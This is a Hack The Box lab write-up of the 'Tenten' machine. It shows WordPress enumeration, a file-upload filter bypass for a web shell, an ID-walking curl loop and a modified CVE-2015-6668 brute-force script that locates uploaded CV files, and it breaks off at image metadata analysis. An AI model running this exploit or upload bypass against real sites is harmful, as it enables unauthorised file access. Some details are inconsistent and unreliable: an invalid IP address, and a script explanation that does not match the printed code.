---
title: "Hack The Box: Tenten"
date: 2026-09-29
ref: WU-008
summary: "Rooting the retired HTB 'Tenten' machine — exploiting a file disclosure vulnerability in the WordPress Job Manager plugin to extract an SSH private key hidden inside a job application image, cracking the key passphrase, and escalating to root via a misconfigured sudo permission on a steganography tool."
tags: [hack-the-box, wordpress, wpscan, job-manager, cve-2015-6668, file-disclosure, steganography, ssh, linux, privilege-escalation, sudo-abuse]
---

<h1 align="center">Tenten — Hack The Box Write-up</h1>

<p align="center">
  <img src="{{ '/assets/img/htb-tenten/Tenten_Logo.png' | relative_url }}" width="300"/>
</p>

**Description:** Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated WordPress plugins, which is a major attack vector that exists in real life.

**Retired machine — `tenten.htb`**

- **IP Address:** 10.10.10.10
- **Operating System:** Ubuntu 16.04 LTS
- **Architecture:** x86_64

**Credentials:** None required for initial access.

**Nmap**

```NMAP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 18:46 -0400
Nmap scan report for 10.129.64.49
Host is up (0.024s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://tenten.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```

**Quick Services:**

| Port | Service                          |
| ---- | -------------------------------- |
| 22   | SSH (OpenSSH 7.2p2)              |
| 80   | HTTP (Apache 2.4.18 — WordPress) |

**Completion Status:**

- Root Flag: [Yes]
- User Flag: [Yes]
- Completion: [Complete] (100%)

---
## Enumeration

To start the machine, we'll begin with our usual Nmap **"Scripts and Services"** scan. This gives us an initial overview of the services exposed by the machine, including the ports that are open and the versions of the services running on them. Having this information gives us a starting point for our enumeration and helps us decide where to focus our attention first.

The scan reveals that the machine has only two ports open, giving us the answer to the first 'Guided Mode' tasks' question. Bearing this in mind, we can take this as a hint that we're on the right track and assume that no wider port scanning will be required on this machine. The output has been trimmed slightly to keep the relevant information visible.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ nmap -sCV -oA Scans/Nmap-Service+Version 10.129.64.498

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://tenten.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our choices are HTTP and SSH, giving us a fairly straightforward choice ahead. As we have no credentials, it would be unwise to attempt any kind of brute-force attack against SSH until we have at least checked out what's available on port 80 first.

---
## HTTP (Port 80) — WordPress

We have safely determined that port 80 is going to be our first port of call, and ahead we'll find that it's running a common CMS, WordPress. We'll need to inspect the content being hosted first before attempting to scan for any possible misconfigurations or vulnerabilities.

First off, we can use our web browser (Firefox in this case, as it's Kali's default) to inspect `http://10.129.64.498` and see what's being hosted. We can see the URL change to `http://tenten.htb`, but no content is loaded. We'll need to edit our `/etc/hosts` file in order to correctly display the page. This happens because the web server is configured with virtual host routing, something we discussed in my [Popcorn](https://hackopotamus.github.io/portfolio/writeups/2026-08-05-htb-popcorn/) write-up.

We use `sudo` and `vim` to edit the `/etc/hosts` file, adding the box's IP address and mapping it to its hostname, as shown below.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ sudo vim /etc/hosts
[sudo] password for kali:

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.129.64.498     tenten.htb 
```

With the hostname now correctly mapped, we can refresh the page and see the site being hosted on port 80. From the content presented, we can see that it's some kind of job portal, while the page itself describes the site as **"Just another WordPress site"**.

This gives us a strong indication that WordPress is being used, which we can confirm along with the version using the Wappalyzer add-on. Wappalyzer identifies the CMS as WordPress and shows that it's running version `4.7.3`, giving us the answer to 'Guided Mode' task two's question.
![HTTP WordPress]({{ '/assets/img/htb-tenten/Tenten_HTTP_WordPress.png' | relative_url }})


We can take a little time to look around the site, and in doing so we gather two useful pieces of information. The first is an indication of when the machine was created. Based on a post made by a user, we can see that the last interaction took place on **April 12, 2017 at 8:37 AM**.

The second piece of information is a username, `takis`, who appears to have created the posts. This gives us the answer to 'Guided Mode' task three's question. 
![HTTP UserDate]({{ '/assets/img/htb-tenten/Tenten_HTTP_UserDate.png' | relative_url }})

At this point, we can start looking for any potential vulnerabilities that may be present on the machine. We'll fire up Burp Suite and capture requests as we explore the website, giving us an opportunity to inspect how the application handles our interactions.

From there, we can try a few different approaches and see if we can identify anything that might give us a foothold on the machine.
### Directory Brute Force

The first thing we'll try is some content discovery using directory brute forcing. For this, we'll use Gobuster with two separate wordlists to see if we can find anything interesting that might be hidden.

We'll start simple by using the `directory-list-2.3-medium.txt` wordlist. We use the `-o` flag to save our results and `-t 50` to run multiple threads in the hope of speeding up the scan.

Once the scan completes, we don't find anything that immediately jumps out at us, so we decide to change our wordlist and try again.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ gobuster dir -u http://tenten.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -o Scans/Gobuster-meduim.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tenten.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 313] [--> http://tenten.htb/wp-content/]
wp-includes          (Status: 301) [Size: 314] [--> http://tenten.htb/wp-includes/]
wp-admin             (Status: 301) [Size: 311] [--> http://tenten.htb/wp-admin/]
server-status        (Status: 403) [Size: 298]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

For the next scan, we decide to try something a little more focused. Some research shows that the SecLists suite contains a `wordpress.fuzz.txt` wordlist specifically designed for WordPress content discovery.

First, we need to install the suite using `sudo apt install seclists`. We can then modify our previous scan to use the new wordlist while keeping many of the same options.

This scan produces a massive list of results, so the output has been trimmed to display only the entries that are of interest to us.
```shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ gobuster dir -u http://tenten.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -t 50 -o Scans/Gobuster-WP-Fuzz.txt    
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tenten.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt                                                    
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content/plugins/akismet/ (Status: 200) [Size: 0]
xmlrpc.php            (Status: 405) [Size: 42]
wp-config.php         (Status: 200) [Size: 0]
wp-admin/setup-config.php (Status: 500) [Size: 3601]
wp-mail.php           (Status: 403) [Size: 3444]
readme.html           (Status: 200) [Size: 7433]
license.txt           (Status: 200) [Size: 19935]
```

`wp-config.php` returned a `200` response with a zero-byte response size, confirming that the file exists and is being processed by PHP rather than being served as plain text. Unfortunately, this doesn't give us any source code disclosure.

`wp-admin/setup-config.php` returned a `500` response, while `wp-mail.php` returned a `403`. Both returned non-zero response sizes, which stood out against the pattern of empty `500` and `403` responses elsewhere on the site. After inspecting them, however, neither revealed anything of value.

`readme.html` confirms the WordPress core version as `4.7`, while `license.txt` corroborates this with matching date ranges. Unfortunately, our scans have mainly helped us validate the version and some dates rather than uncovering anything immediately useful. This gives us a nudge towards trying WPScan later if nothing else more interesting presents itself.
### SQL Injection (SQLi) and Cross Site Scripting (XSS)

We make a few attempts to test the input boxes on the site for SQL injection and XSS, but unfortunately none of them prove successful. Although these attempts don't produce anything useful, they're still a valid part of the process and worth documenting. They show the thought process behind the enumeration, while also highlighting that CTFs aren't always a seamless process of finding one success after another. Sometimes, progress comes from hours of trial and error and ruling things out.

Our first attempt is to post a reply to Takis's original **"Hello World"** comment. We soon find that the comment requires moderation, meaning some form of administrator interaction would be needed before anything we submit could potentially be useful.

We later discover a job application for a penetration tester, which contains several input fields that give us another opportunity to test for vulnerabilities. We capture requests for both the comment reply and the job application through Burp Suite and then use SQLMap to test the requests for SQL injection. Unfortunately, nothing appears to be vulnerable.

The machine's connection also seems to be a little flaky at times, and some of our testing leaves quite a mess in the comment section. As a precaution, we decide to reset the machine and continue from a clean state.

![HTTP CommentModeration]({{ '/assets/img/htb-tenten/Tenten_HTTP_CommentModeration.png' | relative_url }})

### File Upload Vulnerabilities

The only useful finding we've uncovered so far is a file upload function that we discovered while testing some of the other attack vectors. We can now take a closer look at how the upload works and see whether it can be abused to upload malicious files. If we can get something uploaded successfully, we'll then need to determine where the files are being stored so we can attempt to access them.

The first thing we need to establish is whether the upload function applies any filtering to the files we submit. We start by attempting to upload a basic web shell called `shell.php`, but the upload is denied. This tells us that the upload function is applying some form of allow/deny list to control which file types can be uploaded.

![HTTP FailedUpload]({{ '/assets/img/htb-tenten/Tenten_HTTP_FailedUpload.png' | relative_url }})

From here, we can start building a list of file types that are either allowed or disallowed. Understanding how the filter behaves may allow us to identify a way to bypass it if we're able to find a file type that isn't being handled as expected.

We upload a few different common file types and record the results in the table below for reference.

|  **File Type**   | **Allowed / Disallowed** |
| :--------------: | :----------------------: |
|       .pdf       |            ✅             |
|       .jpg       |            ✅             |
|      .docx       |            ✅             |
|       .txt       |            ✅             |
|       .php       |            ❌             |
|      .php5       |            ❌             |
| **Evasion Type** | **Allowed / Disallowed** |
|       .pHp       |            ❌             |
|     .php.jpg     |            ✅             |
|    .docx.php     |            ❌             |

Based on the results above, it would seem that the web application is using some form of allow listing. We can test a few basic filename and extension manipulation techniques, but these don't allow us to upload a PHP file. This helps to support our theory that the application is checking the file extension.

However, when we start experimenting with file type obfuscation and modifying the content type of our requests in Burp Suite, we eventually manage to successfully place files on the machine.
![HTTP UploadBypass]({{ '/assets/img/htb-tenten/Tenten_HTTP_UploadBypass.png' | relative_url }})

We can now refer back to our earlier `gobuster` scan to see if we found any common upload paths. Unfortunately, we don't find anything useful in this instance, meaning we'll have to keep our successful file upload in our pocket for now.

We know we've managed to place a file on the machine, but without knowing where that file is being stored or how we can access it, there's not much more we can do with it at this point. If we find a way to locate the uploaded files later, we can always circle back and see if this finding can be put to use.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Scans]
└─$ cat Gobuster-WP-Fuzz.txt | grep upload
wp-admin/async-upload.php (Status: 302) [Size: 0] [--> http://tenten.htb/wp-login.php?redirect_to=http%3A%2F%2Ftenten.htb%2Fwp-admin%2Fasync-upload.php&reauth=1]
wp-admin/js/media-upload.js (Status: 200) [Size: 1984]
wp-admin/js/media-upload.min.js (Status: 200) [Size: 1153]
wp-admin/media-upload.php (Status: 302) [Size: 0] [--> http://tenten.htb/wp-login.php?redirect_to=http%3A%2F%2Ftenten.htb%2Fwp-admin%2Fmedia-upload.php&reauth=1]
wp-admin/upload.php  (Status: 302) [Size: 0] [--> http://tenten.htb/wp-login.php?redirect_to=http%3A%2F%2Ftenten.htb%2Fwp-admin%2Fupload.php&reauth=1]
wp-includes/images/uploader-icons-2x.png (Status: 200) [Size: 3542]
wp-includes/images/uploader-icons.png (Status: 200) [Size: 1556]
wp-includes/js/plupload/ (Status: 403) [Size: 309]
wp-includes/js/plupload/handlers.min.js (Status: 200) [Size: 10681]
wp-includes/js/plupload/license.txt (Status: 200) [Size: 17987]
wp-includes/js/plupload/handlers.js (Status: 200) [Size: 16256]
wp-includes/js/plupload/wp-plupload.js (Status: 200) [Size: 12714]
wp-includes/js/plupload/plupload.flash.swf (Status: 200) [Size: 29570]
wp-includes/js/plupload/wp-plupload.min.js (Status: 200) [Size: 4920]
wp-includes/js/swfupload/ (Status: 403) [Size: 310]
wp-includes/js/plupload/plupload.silverlight.xap (Status: 200) [Size: 63118]
wp-includes/js/swfupload/handlers.js (Status: 200) [Size: 12655]
wp-includes/js/swfupload/license.txt (Status: 200) [Size: 1540]
wp-includes/js/swfupload/plugins/ (Status: 403) [Size: 318]
wp-includes/js/swfupload/handlers.min.js (Status: 200) [Size: 8867]
wp-includes/js/swfupload/plugins/swfupload.cookies.js (Status: 200) [Size: 1572]
wp-includes/js/swfupload/plugins/swfupload.queue.js (Status: 200) [Size: 3383]
wp-includes/js/swfupload/plugins/swfupload.swfobject.js (Status: 200) [Size: 3926]
wp-includes/js/swfupload/plugins/swfupload.speed.js (Status: 200) [Size: 12234]
wp-includes/js/swfupload/swfupload.swf (Status: 200) [Size: 13133]
wp-includes/js/swfupload/swfupload.js (Status: 200) [Size: 37690]
```
### WordPress Scans

Having found nothing else of immediate interest, we can turn our attention to scanning the WordPress CMS with `wpscan` to see if there are any vulnerable plugins or other known issues. For this, we're going to use the `--api-token` option, which allows WPScan to check its vulnerability database against the components it discovers.

We can register [here](https://wpscan.com/) and receive 25 free API requests per day. After completing the registration, we're given an API token that we can copy and use with the command-line tool.

Once the scan completes, the results are huge, bringing back around 100 potential vulnerabilities. With so many results to work through, we don't immediately find anything that stands out to us. However, after going back through the results, we eventually find a plugin that wasn't discovered during our earlier directory brute-forcing, giving us a few interesting things to unravel:

1. **Job Manager:** The first thing of interest is a previously unknown plugin called `Job-manager`, which appears to be vulnerable to two separate exploits.
2. **CVE-2015-6668:** The first vulnerability, labelled as CVE-2015-6668, appears to be an IDOR vulnerability relating to the disclosure of CV file names. This immediately catches our attention, particularly because we've just managed to upload `shell.php.jpg` through this exact plugin. If this vulnerability can disclose the location of uploaded CV files, it could give us a way to find the file we've just placed on the machine.
3. **Guided Mode answers:** Both of the above findings give us the answers to 'Guided Mode' questions four and five, giving us a nice little two-for-one while also providing another hint that we're heading in the right direction.
4. **Stored XSS:** We also find an administrator stored XSS vulnerability. However, this may be out of scope for us, as it appears to require some form of interaction from an administrator. Given that this is a CTF, that particular attack scenario seems less likely to be useful to us.

```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ wpscan --url http://tenten.htb --enumerate vp --api-token ********************
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://tenten.htb/ [10.129.64.49]
[+] Started: Fri Sep 18 20:57:22 2026
[+] Command Line: wpscan --url http://tenten.htb --enumerate vp --api-token [REDACTED]
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

<----------------------------------SNIP------------------------------------------->

[+] Enumerating Vulnerable Plugins (via Passive and Aggressive Methods)

[+] job-manager
 | Location: http://tenten.htb/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25 10:44pm GMT (11 years ago)
 | Readme: http://tenten.htb/wp-content/plugins/job-manager/readme.txt
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference (IDOR)
 |     UUID: 9fd14f37-8c45-46f9-bcb6-8613d754dd1c
 |     References:
 |      - https://wpscan.com/vulnerability/9fd14f37-8c45-46f9-bcb6-8613d754dd1c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | [!] Title: Job Manager <= 0.7.25 - Admin+ Stored Cross-Site Scripting
 |     UUID: e649292a-81d2-40c4-a075-ac98a3578fe8
 |     References:
 |      - https://wpscan.com/vulnerability/e649292a-81d2-40c4-a075-ac98a3578fe8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39336
 |      - https://www.wordfence.com/vulnerability-advisories/#CVE-2021-39336
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt
 Checking Known Locations - Time: 00:00:39 <==================================================================> (7343 / 7343) 100.00% Time: 00:00:39
[i] 1 plugin(s) Identified.
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 0
 | Requests Remaining: 21
[+] Finished: Fri Sep 18 20:58:06 2026
[+] Requests Done: 7355
[+] Cached Requests: 43
[+] Most response codes received: 404: 7345, 200: 9, 403: 1
[+] Data Sent: 1.898 MB
[+] Data Received: 1.103 MB
[+] Memory used: 283.516 MB
[+] Elapsed time: 00:00:44
```

This section has been quite long, but we've managed to locate a promising candidate for further investigation. In the next section, we can take a closer look at the vulnerability and its associated exploit, and explore how we might be able to use it to gain access to the machine.

---
## Job Manager Plugin — File Disclosure (CVE-2015-6668)

Given that we've already managed to place a web shell on the machine by bypassing the file upload restrictions, the **Job Manager <= 0.7.25 - Insecure Direct Object Reference (IDOR)** exploit seems like a promising candidate. If the vulnerability allows us to discover where our uploaded web shell is stored, we may be able to use it to achieve Remote Code Execution (RCE).

Doing some research based on the references available to us shows that _"It is possible to enumerate the CV filename that is uploaded on the server and then access the CV file by performing a brute force attack to the WordPress upload directory structure."_

With this in mind, we can formulate a theory around how the IDOR vulnerability might work. We know that the vulnerable functionality is part of Job Manager, so we can think back to where we uploaded our CV. Looking at the URL, we can see the path is:

* `http://tenten.htb/index.php/jobs/apply/8/`

Perhaps the number at the end of the URL is being used as an identifier. If that's the case, we might be able to manipulate it and see whether we can access something we shouldn't.
![CVE 2015 6668 IDOR]({{ '/assets/img/htb-tenten/Tenten_CVE-2015-6668_IDOR.png' | relative_url }})

The results above confirm that the IDOR vulnerability exists and appear to show us walking through the application's WordPress post ID space. From the results we're seeing what looks to be the title of each application being reflected, so we should try working through some more of these IDs to see if we can find anything useful.

Rather than doing this manually, we can automate the process using `curl` and systematically request each ID. We can use the Bash script below to do this for us. As this is a little more complicated than a simple one-liner, we'll break down what each part of the command is doing:

- **`for id in $(seq 1 30); do ... done`** — loops through IDs 1 to 30, running everything inside the loop once per number, with `$id` holding the current value each time.
- **`curl -s -o /tmp/resp.html -w "%{http_code}" "..."`** — sends the request for each ID; `-s` keeps `curl`'s own output quiet, `-o /tmp/resp.html` saves the page body to a temporary file rather than printing it, and `-w "%{http_code}"` prints just the HTTP status code, which gets captured into the `status` variable.
- **`grep 'entry-title' /tmp/resp.html`** — searches the saved page body for the line containing WordPress's `entry-title` class, which is where the page or post heading lives in the HTML.
- **`cut -d'>' -f2`** — splits that line on `>` and keeps the second piece, stripping off the opening tag (for example, `<h1 class="entry-title">`) and leaving the title plus its closing tag.
- **`cut -d'<' -f1`** — splits on `<` and keeps the first piece, cutting off the closing tag and leaving just the plain title text, which is captured into the `title` variable.
- **`printf "%-3s | %-4s | %s\n" "$id" "$status" "$title"`** — prints the three values as a neatly aligned row. The `%-3s` and `%-4s` format the ID and status columns to a fixed width so everything lines up like a table.
- **`done | tee ../Scans/idor_results.txt`** — pipes the entire loop's output both to the terminal, so we can see it live, and into `idor_results.txt` in our `Scans` folder. This gives us a saved copy of the results without needing to manually copy and paste them from the terminal.
```Bash
for id in $(seq 1 30); do
    status=$(curl -s -o /tmp/resp.html -w "%{http_code}" "http://tenten.htb/index.php/jobs/apply/$id/")
    title=$(grep -oP '(?<=<title>).*?(?=</title>)' /tmp/resp.html)
    echo "$id | $status | $title" | tee -a ../Scans/idor_results.txt
done
```

We save the script as `IDOR.sh` and then run it. The output gives us some very interesting results, with a few things here that are worth unpacking.

Firstly, we find our `shell.php` that we uploaded earlier, but we still don't know the location of the file. We also see something called `HackerAccessGranted`, which gives us the answer to 'Guided Mode' task six's question. However, we're still left with the same problem: we don't know where this item is located or, in this case, exactly what the file might be.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Exploit]
└─$ bash IDOR.sh
1   | 200  | Job Application: Hello world!
2   | 200  | Job Application: Sample Page
3   | 200  | Job Application: Auto Draft
4   | 200  | Job Application
5   | 200  | Job Application: Jobs Listing
6   | 200  | Job Application: Job Application
7   | 200  | Job Application: Register
8   | 200  | Job Application: Pen Tester
9   | 200  | Job Application:
10  | 200  | Job Application: Application
11  | 200  | Job Application: cube
12  | 200  | Job Application: Application
13  | 200  | Job Application: HackerAccessGranted
14  | 200  | Job Application: Application
15  | 200  | Job Application: test
16  | 200  | Job Application: Application
17  | 200  | Job Application: test
18  | 200  | Job Application: Application
19  | 200  | Job Application: test
20  | 200  | Job Application: Application
21  | 200  | Job Application: test
22  | 200  | Job Application: Application
23  | 200  | Job Application: shell.php
24  | 200  | Job Application
25  | 200  | Job Application
26  | 200  | Job Application
27  | 200  | Job Application
28  | 200  | Job Application
29  | 200  | Job Application
30  | 200  | Job Application
```

After fumbling around here for a while, we need to take a hint and check out [0xdf](https://0xdf.gitlab.io/2020/07/14/htb-tenten.html)'s write-up. This prompts us to realise that we've overlooked something fairly simple: we were given a CVE, so we should be looking for a Proof of Concept (PoC) to go along with it. The IDOR is only part of the exploit, and the PoC should help us understand how the vulnerability can actually be leveraged.

Now that we're back on track, we can copy the `CVE-2015-6668` script from the write-up and save it as `exploit.py` for ease of use.

> **Alternate Versions**
> 
> Although there is absolutely no shame in taking a hint when we need to, failing to recognise that the exploit was more than just the IDOR vulnerability made things more complicated than they needed to be. We could have used a Google dork such as `site:github.com CVE-2015-6668` to find two working versions that required no edits at all.
> 
> * [Python 2 Version](https://github.com/h3x0v3rl0rd/CVE-2015-6668/blob/main/brute.py) - Working version that already contains filetype modifications.
> * [Python 3 Versions](https://github.com/jimdiroffii/CVE-2015-6668) - Ported Python 3 version that also contains the filetype modifications.
> 
> Just to be clear, this was simply an oversight and was likely a result of being tired while attempting to juggle CREST certification study, a time-consuming write-up, and life in general. It's also a good example of something we discussed in the **Bastard** machine: sometimes we can overcomplicate things or miss something obvious, and that's something that happens to all of us at some point. I'm leaving this section in to show that the process isn't always as straightforward as the finished write-up might make it look.

We notice that the script is written in Python 2, but fortunately it requires no modifications to run. The required `requests` module is already installed, so we can run the script as it is.

Using the exploit to search for the interesting files we discovered earlier with our `IDOR.sh` Bash script, we don't find anything. At this point, we suspect that something in the way the script is working may be preventing us from getting the results we're expecting, so we'll need to inspect the code and see if we can work out what's happening.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ nano exploit.py

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ python2 exploit.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://tenten.htb
Enter a file name: shell.php

┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen]
└─$ python2 exploit.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://tenten.htb
Enter a file name: HackerAccessGranted
```


Checking the exploit, we can see that we'll need to make a couple of changes before it will work for our situation. There are two things that need to be updated: one is a logical change based on what we already know, while the other requires a little more trial and error.

The first change is to the date range used by the script. The original range only goes up to 2018, so we expand this to 2026 in the hope that we can locate the `shell.php` file we uploaded earlier.

We also modify the file types that the brute-force process will search for, adding PHP scripts and common image file types. For this, we can use the table we formulated earlier as a guide, as it shows us which file types the application allows users to upload. These are the kinds of files we would reasonably expect other users to submit through the job application form, making them useful candidates to include in our search.
```Python
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2026): #<--- Change (1)
    for i in range(1,13):
        for extension in {'doc','pdf','docx','php','txt','jpg'}: # <- Change (2)
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```


Now when we run the modified script again, we at least get one hit, revealing the file path of our previously unknown item: `content/uploads/2017/04/HackerAccessGranted.jpg`. This gives us the answer to 'Guided Mode' task sevens question and, more importantly, gives us something we can investigate further.

As we can't locate `shell.php`, we'll switch our focus for now and see what we can discover about the image file. We can always come back to the missing web shell later and see if we're able to locate it in the **Beyond Root** section.
```Shell
┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Exploit]
└─$ python2 exploit.py                                                                                                                           
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25

Enter a vulnerable website: http://tenten.htb
Enter a file name: shell.php


┌──(kali㉿kali)-[~/…/Hack The Box/Machines/TenTen/Exploit]
└─$ python2 exploit.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://tenten.htb
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg

```

Inspecting the file at its location on the web server shows us an unusual image stating that access is granted. This seems like a very CTF-like file to have placed on the machine, and we now have a strong indication that this is the intended file we're supposed to find.

![CVE 2015 6668 HackerAccessGranted]({{ '/assets/img/htb-tenten/Tenten_CVE-2015-6668_HackerAccessGranted.png' | relative_url }})

In the next section, we can take a closer look at the file and see if we can find anything useful that might help us progress.

---
## Steganography — Extracting the SSH Key

Now that we've located the file, we can start taking a closer look at it and see whether there are any clues hidden within its contents. We'll approach this much like we would any other file during an investigation, starting with some basic analysis before moving on to more specialised tools if necessary.

First, we need to download the image so we can analyse it locally. We'll use `wget` to retrieve the file while preserving its original properties. Once we have a local copy, we can inspect its metadata and use tools such as `binwalk` and `strings` to look for anything unusual or potentially hidden within the file.
```bash
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ wget http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
--2026-09-19 14:46:26--  http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
Resolving tenten.htb (tenten.htb)... 10.129.64.49
Connecting to tenten.htb (tenten.htb)|10.129.64.49|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 262408 (256K) [image/jpeg]
Saving to: ‘HackerAccessGranted.jpg’

HackerAccessGranted.jpg              100%[===================================================================>] 256.26K  --.-KB/s    in 0.1s     

2026-09-19 14:46:27 (2.09 MB/s) - ‘HackerAccessGranted.jpg’ saved [262408/262408]
```

We first inspect the image and can see that the metadata is still intact. Unfortunately, the information doesn't reveal anything of particular interest, other than confirming that the file was last modified in 2017.

We know that this file is unlikely to have been placed on the server for no reason, and given its unusual name and contents, it's reasonable to theorise that there may be something hidden within the file that we haven't uncovered yet.
```Shell
┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/TenTen/Loot]
└─$ exiftool HackerAccessGranted.jpg
ExifTool Version Number         : 13.55
File Name                       : HackerAccessGranted.jpg
Directory                       : .
File Size                       : 262 kB
File Modification Date/Time     : 2017:04:12 06:01:57-04:00
File Access Date/Time           : 2026:09:19 14:46:27-04:00
File Inode Change Date/Time     : 2026:09:19 14:46:27-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : cm
